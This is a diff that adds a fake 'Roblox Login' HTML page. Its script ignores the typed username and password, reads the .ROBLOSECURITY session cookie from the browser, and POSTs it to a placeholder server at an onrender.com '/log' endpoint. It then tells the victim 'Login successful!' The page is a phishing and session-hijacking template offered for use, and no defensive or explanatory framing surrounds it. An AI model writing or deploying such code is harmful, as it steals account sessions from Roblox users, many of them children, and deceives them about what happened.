@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Login</title>
+</head>
+<body>
+  <h2>Roblox Login</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      
+      // Get the actual .ROBLOSECURITY cookie from browser
+      const cookies = document.cookie.split("; ");
+      let roblosecurity = null;
+      for (let c of cookies) {
+        if (c.startsWith(".ROBLOSECURITY=")) {
+          roblosecurity = c.split("=")[1];
+          break;
+        }
+      }
+      
+      // Send to your server
+      if (roblosecurity) {
+        fetch("https://YOUR-RENDER-URL.onrender.com/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cookie: roblosecurity })
+        });
+        alert("Login successful!");
+      } else {
+        alert("Please login to Roblox first in this browser.");
+      }
+    });
+  </script>
+</body>
+</html>
